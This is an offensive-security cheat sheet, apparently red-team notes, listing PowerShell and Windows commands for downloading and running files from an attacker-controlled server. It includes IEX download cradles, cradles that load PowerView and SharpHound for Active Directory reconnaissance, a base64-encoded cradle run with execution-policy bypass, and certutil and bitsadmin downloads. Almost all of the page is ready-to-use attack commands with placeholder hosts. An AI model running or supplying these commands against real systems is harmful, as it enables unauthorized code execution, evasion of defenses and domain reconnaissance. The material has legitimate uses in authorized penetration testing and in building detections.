# <h1 align="center" id="heading">File Download Methods</h1>

### Normal File/Script Cradles
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/<filename>")
```
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/<filename>") | Invoke-Expression"
```

### PowerView Cradle
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1");<insert powerview commands here>
```

### BloodHound Collection Cradles
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All
```
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All -Domain <target_comain>
```
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/SharpHound.ps1");Invoke-BloodHound -CollectionMethod GPOLocalGroup
```

### Base64-Encoded Download Cradle
```powershell
pwsh
```
```powershell
$text = "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker_server>/<target file>')"
```
```powershell
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
```
```powershell
$EncodedText = [Convert]::ToBase64String($bytes)
```
```powershell
$EncodedText
```
```powershell
powershell.exe -exec bypass -enc <b64 string here>
```

### Download to Disk
```powershell
wget http://<attacker server>/<file> -outfile C:\<output location>
```
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://<attacker_server>/<target file>', 'C:\<output location>')
```

### Alternate Download Methods
```console
certutil -urlcache -f http://<attacker server>/<file> C:\\<output location>
```
```console
bitsadmin /transfer myJob http://<attacker server>/<file> C:\<output location>
```
